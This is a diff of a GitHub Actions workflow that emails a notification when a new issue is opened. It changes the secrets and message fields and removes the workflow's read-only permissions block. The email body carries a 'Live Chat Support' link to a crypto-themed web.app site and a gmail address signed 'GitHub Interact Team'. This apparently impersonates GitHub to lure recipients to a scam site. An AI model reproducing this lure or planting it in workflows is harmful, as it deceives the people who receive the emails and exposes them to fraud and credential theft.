@@ -1,12 +1,8 @@
-name: Notify on New Issue
+name: Email Notification on New Issue
 
 on:
   issues:
     types: [opened]
-
-permissions:
-  issues: read
-  contents: read
 
 jobs:
   notify:
@@ -17,16 +13,21 @@ jobs:
         with:
           server_address: smtp.gmail.com
           server_port: 465
-          username: ${{ secrets.EMAIL_USERNAME }}
-          password: ${{ secrets.EMAIL_PASSWORD }}
+          username: ${{ secrets.NOTIFY_EMAIL }}
+          password: ${{ secrets.NOTIFY_EMAIL_PASSWORD }}
           subject: "New GitHub Issue Opened: ${{ github.event.issue.title }}"
+          to: ${{ secrets.NOTIFY_EMAIL }}
+          from: GitHub Bot
           body: |
             👋 Hello,
 
             A new issue has been opened in your repository.
 
-            Issue Title: ${{ github.event.issue.title }}
-            Issue URL: ${{ github.event.issue.html_url }}
+            Repository: ${{ github.repository }}
+            Title: ${{ github.event.issue.title }}
+            Author: ${{ github.event.issue.user.login }}
+
+            View issue: ${{ github.event.issue.html_url }}
 
             For quick assistance, click here:
             [Open Live Chat Support](https://git-cryptoresolvehub.web.app/)
@@ -34,5 +35,4 @@ jobs:
             Email: GitHub.interact@gmail.com
 
             — GitHub Interact Team 🚀
-          to: ${{ secrets.NOTIFY_EMAIL }}
           secure: true
